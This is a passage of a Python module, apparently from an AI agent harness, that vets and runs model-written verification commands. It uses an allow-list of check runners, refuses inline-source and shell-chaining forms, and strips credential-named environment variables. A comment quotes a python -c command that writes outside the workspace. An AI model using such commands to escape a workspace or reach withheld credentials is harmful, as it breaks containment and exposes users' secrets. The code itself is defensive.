                    "nothing changed."
                ),
                mandatory=True,
            ),
        )

    if policy.require_code_quality:
        bar(
            bool(_COVERS_CODE_QUALITY.search(existing)),
            DoDCriterion(
                statement=(
                    "The change follows the conventions of the files it touches and "
                    "introduces no duplicated logic that already exists in the codebase"
                ),
                method=VerifyMethod.REVIEW,
                rubric=(
                    "Compare against the surrounding code. Pass only if naming, structure "
                    "and error handling match local convention, and no copied block "
                    "duplicates an existing helper."
                ),
                mandatory=True,
            ),
        )

    task.dod.extend(added)
    task.updated_at = now_iso()
    return added


# --------------------------------------------------------------------------
# Verification
# --------------------------------------------------------------------------


@dataclass
class VerificationOutcome:
    status: CriterionStatus
    evidence: str
    verified_by: str = "harness"


def unquoted_metacharacter(command: str, characters: str = _METACHARACTERS) -> str | None:
    """The first of ``characters`` outside quotes, or ``None`` if there is none.

    Quoting is what separates ``python -c "a; b"`` -- one argument to one
    program -- from ``a; b``, which is two commands. A token scan cannot tell
    them apart after the fact, so the raw string is read here instead.

    ``characters`` defaults to the metacharacters that chain or redirect a
    command; :mod:`.tools` passes the glob characters instead, which are
    dangerous for a different reason but need the same quote-aware scan.
    """
    quote = ""
    for char in command:
        if quote:
            if char == quote:
                quote = ""
        elif char in "'\"":
            quote = char
        elif char in characters:
            return char
    return None


# Interpreters on the check-runner list that will also run a program handed to
# them in the command line itself, and the flags by which they do it. They earn
# their place on that list by running the project's tests -- ``python -m pytest``
# -- but ``python -c "open('../../x','w').write('')"`` is the same binary
# carrying source no check has seen, naming its paths at runtime where no
# argument check can reach them. Both an agent's shell and a criterion's command
# refuse these flags; ``-m`` and a script path stay open. Each entry is (short
# source flags, long source flags, short flags whose value is the next token,
# short flags after which the arguments stop being the interpreter's own).
_Interpreter = tuple[frozenset[str], frozenset[str], frozenset[str], frozenset[str]]
_INLINE_SOURCE: dict[str, _Interpreter] = {
    "python": (frozenset("c"), frozenset(), frozenset("WX"), frozenset("m")),
    "python3": (frozenset("c"), frozenset(), frozenset("WX"), frozenset("m")),
    "py": (frozenset("c"), frozenset(), frozenset("WX"), frozenset("m")),
    "node": (frozenset("ep"), frozenset({"--eval", "--print"}), frozenset("r"),
             frozenset()),
}


_POWERSHELL = frozenset({"pwsh", "powershell"})

#: The only options a PowerShell check may carry before its script. Anything
#: else -- `-Command`, `-c`, `-EncodedCommand`, `-CommandWithArgs` -- runs code
#: written into the command line, and is refused by name or by omission.
_POWERSHELL_FLAGS = frozenset({"-noprofile", "-nologo", "-noninteractive", "-file"})
_POWERSHELL_VALUED = frozenset({"-executionpolicy"})


def powershell_refusal(tokens: list[str]) -> str | None:
    """Why this PowerShell invocation may not run as a check; ``None`` if it may.

    A project's verification script -- `pwsh scripts/verify.ps1`, which one
    project's workflow requires and a go-live run's root task named, stalling
    six tasks that depended on it -- is the same trust as `npm run check`: code
    the repository holds. A command line is not. Windows PowerShell reads a
    bare argument as a command, not a file, so this is a positive rule: a
    `.ps1` file must be named, with only the options above before it.
    """
    skip = False
    for token in tokens[1:]:
        if skip:
            skip = False
            continue
        flag = token.lower()
        if flag in _POWERSHELL_VALUED:
            skip = True
            continue
        if flag in _POWERSHELL_FLAGS:
            continue
        if flag.startswith("-"):
            return (f"it passes {token!r} to PowerShell; a check may only run a .ps1 "
                    "script the repository holds")
        if flag.endswith(".ps1"):
            # POSIX rules on every machine, so a path is judged here as it is on
            # CI, and the drive-letter test below is what catches `C:/...`.
            script = PurePosixPath(token.replace("\\", "/"))
            if (script.is_absolute() or ".." in script.parts or token[:1] in "/\\"
                    or re.match(r"[A-Za-z]:", token)):
                return (f"{token!r} is outside the repository; a check may only run a "
                        "script the repository holds, named relative to it")
            return None  # the script's own arguments follow, and are its business.
        return (f"{token!r} is not a .ps1 script; PowerShell would run it as a "
                "command, and a check may only run a script the repository holds")
    return "it names no .ps1 script for PowerShell to run"


def inline_source_flag(tokens: list[str]) -> str | None:
    """The flag by which this command carries its own source, or ``None``.

    Only the interpreter's own leading options are read. After ``-m module`` or
    a script path the arguments belong to the program being run, where ``-c`` is
    pytest's config file rather than Python's source, and refusing it there would
    fence a legitimate check.
    """
    if not tokens:
        return None
    entry = _INLINE_SOURCE.get(executable_name(tokens[0]))
    if entry is None:
        return None
    source, long_source, takes_value, terminal = entry

    skip = False
    for token in tokens[1:]:
        if skip:  # the value of the flag before it, not a flag itself.
            skip = False
            continue
        # S105 reads `token` as a credential. It is a command-line token: this
        # function walks the argv of a command being inspected.
        if token == "-":  # noqa: S105 - a shell token, not a secret
            return "-"  # the program is read from standard input.
        if token == "--" or not token.startswith("-"):  # noqa: S105 - as above
            return None  # the interpreter's own options have ended.
        if token.startswith("--"):
            name = token.partition("=")[0]
            if name in long_source:
                return name
            continue
        for index, char in enumerate(token[1:]):
            if char in source:
                return f"-{char}"
            if char in terminal:
                return None
            if char in takes_value:
                # ``-W ignore`` and ``-Wignore`` are the same flag.
                skip = index == len(token) - 2
                break
    return None


#: Environment variables a command the harness runs does not inherit: the
#: user's credentials. The command is a check runner, and a check runner runs
#: whatever the project tells it to -- a test, a ``package.json`` script, a
#: Makefile target. Handing it ``ANTHROPIC_API_KEY`` gives the key to code the
#: user has not read. Matched by name, so a project whose own tests need a
#: secret has to be given it deliberately, outside the harness.
_CREDENTIAL_NAME = re.compile(
    r"(API_?KEY|TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIALS?)$"
    r"|^AWS_(ACCESS_KEY_ID|SECRET_ACCESS_KEY|SESSION_TOKEN)$"
    r"|^(ANTHROPIC|OPENROUTER|OPENAI)_",
    re.IGNORECASE,
)

#: Nor the harness's own settings. ``SUPERVISOR_HOME`` names the store and the
#: one configuration that may set protected policy; a check runner has no use
#: for either. Measured in a go-live run on this repository: three of its CLI
#: tests inherited the run's ``SUPERVISOR_HOME``, looked for their runs in the
#: trial store, and failed the full-suite criterion of a task that broke
#: nothing.
_HARNESS_SETTING = re.compile(r"^SUPERVISOR_", re.IGNORECASE)


def child_environment() -> dict[str, str]:
    """This process's environment without the credentials or the harness's settings."""
    return {k: v for k, v in os.environ.items()
            if not _CREDENTIAL_NAME.search(k) and not _HARNESS_SETTING.search(k)}


def run_bounded(argv: list[str], cwd: Path | str, timeout: float,
                extra_env: dict[str, str] | None = None,
                ) -> subprocess.CompletedProcess[str]:
    """Run ``argv`` without a shell, and stop it -- all of it -- at ``timeout``.

    ``subprocess.run(timeout=...)`` kills the process it started and nothing
    that process started. On Windows ``npm``, ``npx`` and ``yarn`` are ``.cmd``
    shims, which run inside ``cmd.exe``: the timeout killed ``cmd`` and the
    program kept running and holding the pipes, so the call returned only when
    the program finished. Measured: a 1-second timeout on a shim returned after
    7.1 seconds. The whole tree is killed instead -- ``taskkill /T`` on Windows,
    the process group elsewhere -- and ``TimeoutExpired`` is raised as before.
    The command also runs without the user's credentials (`child_environment`),
    plus ``extra_env``: the harness's own additions, never a model's.
    """
    env = {**child_environment(), **(extra_env or {})}
    if sys.platform == "win32":
        proc = subprocess.Popen(  # noqa: S603 - tokenised, no shell, allow-listed
            argv, cwd=str(cwd), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
            errors="replace", env=env,
            creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,
        )
    else:
        proc = subprocess.Popen(  # noqa: S603 - tokenised, no shell, allow-listed
            argv, cwd=str(cwd), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
            errors="replace", env=env, start_new_session=True,
        )
    try:
        out, err = proc.communicate(timeout=timeout)
    except subprocess.TimeoutExpired:
        _kill_tree(proc)
        try:
            out, err = proc.communicate(timeout=10)
        except subprocess.TimeoutExpired:
            out, err = "", ""
        raise subprocess.TimeoutExpired(argv, timeout, output=out, stderr=err) from None
    return subprocess.CompletedProcess(argv, proc.returncode, out, err)


def _kill_tree(proc: subprocess.Popen[str]) -> None:
    if sys.platform == "win32":
        subprocess.run(  # noqa: S603 - fixed argv, no shell
            ["taskkill", "/F", "/T", "/PID", str(proc.pid)],  # noqa: S607
            capture_output=True, check=False,
        )
    # Plain try/except rather than contextlib.suppress: the project's guard
    # counts every `suppress` as a broad one (test_enforce_versus_observe).
    else:
        try:  # noqa: SIM105
            os.killpg(proc.pid, signal.SIGKILL)
        except (ProcessLookupError, PermissionError):
            pass  # already gone, or not ours to signal; `kill` below still runs
    try:  # noqa: SIM105
        proc.kill()
    except OSError:
        pass  # the tree is already dead


def executable_name(token: str) -> str:
    """The bare program name a command's first token invokes.

    ``/usr/bin/python3``, ``C:\\Python\\python.EXE`` and ``python`` are the same
    program, and an allow-list has to compare them as one.
    """
    return Path(token.replace("\\", "/")).name.lower().removesuffix(".exe")


def unsafe_command(command: str) -> str | None:
    """Why this command must not be run here, or ``None`` if it may be.

    Criterion commands arrive as model output (``parse_dod``) and are run with
    the harness's own permissions, so they are checked before use rather than
    trusted: no shell, and only the project's own check runners.
    """
    tokens = shell_split(command)
    if not tokens:
        return "the command is empty once tokenised"

    metacharacter = unquoted_metacharacter(command)
    if metacharacter is not None:
        return (
            f"it contains the unquoted shell metacharacter {metacharacter!r}, and "
            "criterion commands are run without a shell. Express each check as its "
            "own criterion instead of chaining or redirecting them"
        )

    executable = executable_name(tokens[0])
    if executable not in VERIFY_EXECUTABLES:
        return (
            f"{executable!r} is not one of the check runners a criterion may invoke "
            f"({', '.join(sorted(VERIFY_EXECUTABLES))}). Verify this by review, or by "
            "a command the user chooses to run themselves"
        )
    if executable in _POWERSHELL:
        return powershell_refusal(tokens)
    # The rule an agent's shell already had. Without it here, a criterion --
    # model output -- could carry any program at all as `python -c "..."`.
    inline = inline_source_flag(tokens)
    if inline is not None:
        return (
            f"it passes {inline!r} to {executable!r}, which runs a program written into "
            "the command line itself. Check by a test file or a module instead "
            "(python -m pytest ...)"
        )
    return None


def verify_command(
    criterion: DoDCriterion,
    workspace: Path,
    timeout: int = 300,
) -> VerificationOutcome:
    """Run a command criterion and judge it by exit code and expected output.

    Only reached when the caller has established that running commands here is
    permitted; see :func:`verify_criterion`. The command is tokenised and run
    without a shell, and refused outright unless :func:`unsafe_command` clears
    it -- a criterion the harness will not run is blocked, and blocked is not
    proven, so refusing here cannot certify anything.
    """
    command = criterion.command.strip()
    if not command:
        return VerificationOutcome(CriterionStatus.BLOCKED, "no command specified")

    refusal = unsafe_command(command)
    if refusal is not None:
        return VerificationOutcome(
            CriterionStatus.BLOCKED, f"refused to run {command!r}: {refusal}"
        )

    # The allow-list clears a program name; running it needs a file. On Windows
    # npm, npx and yarn are ``.cmd`` shims, which CreateProcess cannot launch by
    # bare name -- so ``npm test --silent``, the command ``detect_test_command``
    # emits for a package.json project, came back BLOCKED there, and BLOCKED is
    # neither PASS nor WAIVED, so that criterion could never be closed. Looking
    # the name up on PATH honours PATHEXT and hands subprocess the shim itself.
    # This is the same search the process launcher would have done, narrowed to
    # nothing: an unresolvable name is refused here rather than in the OSError
    # below, so the evidence says the runner is missing.
    argv = shell_split(command)
    executable = shutil.which(argv[0])
    substituted = ""
    if executable is None and executable_name(argv[0]) == "pwsh":
        # A project whose script is written for Windows PowerShell may name
        # `pwsh` in its workflow; on a machine with only `powershell`, that is
        # the one that runs it. Said in the evidence, not done quietly.
        executable = shutil.which("powershell")
        substituted = ("\n[supervisor] `pwsh` is not on PATH; the script was run with "
                       "Windows PowerShell (`powershell`) instead.")
    if executable is None:
        return VerificationOutcome(
            CriterionStatus.BLOCKED,
            f"refused to run {command!r}: {executable_name(argv[0])!r} is not on PATH",
        )
    argv[0] = executable

    try:
        completed = run_bounded(argv, workspace, timeout)
    except subprocess.TimeoutExpired:
        return VerificationOutcome(
            CriterionStatus.FAIL, f"command timed out after {timeout}s: {command}"
        )
    except OSError as exc:
        return VerificationOutcome(CriterionStatus.BLOCKED, f"could not run {command!r}: {exc}")

    output = (completed.stdout + completed.stderr).strip()
    tail = output[-1500:]
    evidence = f"$ {command}\nexit={completed.returncode}\n{tail}{substituted}"

    expect = criterion.expect.strip()
    if not expect:
        ok = completed.returncode == 0
    else:
        # An expectation is either an exit code, or a substring that must appear
        # in the output *of a command that also succeeded*. Treating a substring
        # as sufficient on its own was a bug with real consequences: a test
        # command that printed "3 tests failed" and exited 1 satisfied an
        # expectation of "tests", so the check whose whole purpose is refusing
        # unproven work certified a failing suite.
        exit_match = re.fullmatch(r"(?:exit\s*(?:code)?\s*[= ]\s*)?(\d+)", expect, re.IGNORECASE)
        if exit_match:
            ok = completed.returncode == int(exit_match.group(1))
        else:
            ok = completed.returncode == 0 and expect.lower() in output.lower()
            if completed.returncode != 0 and expect.lower() in output.lower():
                evidence += (
                    f"\n\n[supervisor] the expected text {expect!r} appeared, but the "
                    f"command exited {completed.returncode}; a criterion is not met by "
                    "a command that failed. Express an expected failure as an exit code."
                )

    # A filter that selects nothing is not an error to most runners, so exit 0
    # here means either "everything passed" or "nothing ran", and only the
    # output tells them apart. ``unpinned_selection`` refuses this shape when
    # the criterion is written; this catches the filter that went stale after
    # it was approved, and the runner whose flag is not on that list.
    if ok and selection_filter(command) and _RAN_NOTHING.search(output):
        return VerificationOutcome(
            CriterionStatus.FAIL,
            evidence
            + "\n\n[supervisor] the command exited 0 but its filter selected no "
            "tests, so this criterion proved nothing. Name the test node ids it "
            "means, or correct the filter.",
        )

    return VerificationOutcome(
        CriterionStatus.PASS if ok else CriterionStatus.FAIL, evidence
    )


def verify_inspection(criterion: DoDCriterion, workspace: Path) -> VerificationOutcome:
    """Check a file-state expectation of the form ``path: substring``."""
    expect = criterion.expect.strip()
    if not inspectable(expect):
        return VerificationOutcome(
            CriterionStatus.BLOCKED, f"inspection expectation must read {INSPECTION_FORM!r}",
        )
    raw_path, _, needle = expect.partition(":")
    path = (workspace / raw_path.strip()).resolve()
    needle = needle.strip()

    try:
        path.relative_to(workspace.resolve())
    except ValueError:
        return VerificationOutcome(
            CriterionStatus.BLOCKED, f"path escapes the workspace: {raw_path.strip()}"
        )
    if not path.is_file():
        return VerificationOutcome(CriterionStatus.FAIL, f"{raw_path.strip()} does not exist")

    try:
        content = path.read_text(encoding="utf-8", errors="replace")
    except OSError as exc:
        return VerificationOutcome(CriterionStatus.BLOCKED, f"could not read {raw_path}: {exc}")

    if not needle:
        return VerificationOutcome(CriterionStatus.PASS, f"{raw_path.strip()} exists")

    if needle in content:
        line_no = content[: content.index(needle)].count("\n") + 1
        return VerificationOutcome(
            CriterionStatus.PASS, f"{raw_path.strip()}:{line_no} contains {needle!r}"
        )
    return VerificationOutcome(
        CriterionStatus.FAIL, f"{raw_path.strip()} does not contain {needle!r}"
    )


def verify_criterion(
    criterion: DoDCriterion,
    workspace: Path,
    policy: Policy,
    *,
    allow_commands: bool,
) -> VerificationOutcome | None:
    """Verify a criterion here, or return ``None`` to delegate it.

    ``None`` means the harness cannot or should not prove this one itself --
    review criteria always need a judge, and commands only run when explicitly
    permitted. Those go to the host or a verification agent instead.
    """
    if criterion.method is VerifyMethod.INSPECTION:
        return verify_inspection(criterion, workspace)

    if criterion.method in (VerifyMethod.COMMAND, VerifyMethod.TEST):
        if not allow_commands:
            return None
        return verify_command(criterion, workspace)

    return None


def summarise(task: ExecutionTask) -> str:
    """One-line status of a task's definition of done."""
    mandatory = task.mandatory_criteria
    passed = sum(1 for c in mandatory if c.status is CriterionStatus.PASS)
    waived = sum(1 for c in mandatory if c.status is CriterionStatus.WAIVED)
    failed = [c for c in mandatory if c.status is CriterionStatus.FAIL]
    parts = [f"{passed}/{len(mandatory)} mandatory criteria proven"]
    if waived:
        parts.append(f"{waived} waived")
    if failed:
        parts.append(f"{len(failed)} failing")
    return ", ".join(parts)


def shell_split(command: str) -> list[str]:
    """Best-effort tokenisation, used for display and for shell-free execution.

    A command that :func:`unsafe_command` has cleared contains no unquoted
    metacharacter, so this tokenisation is the whole of its meaning; the
    fallback exists only so a malformed command can still be shown.
    """
    try:
        return shlex.split(command)
    except ValueError:
        return command.split()
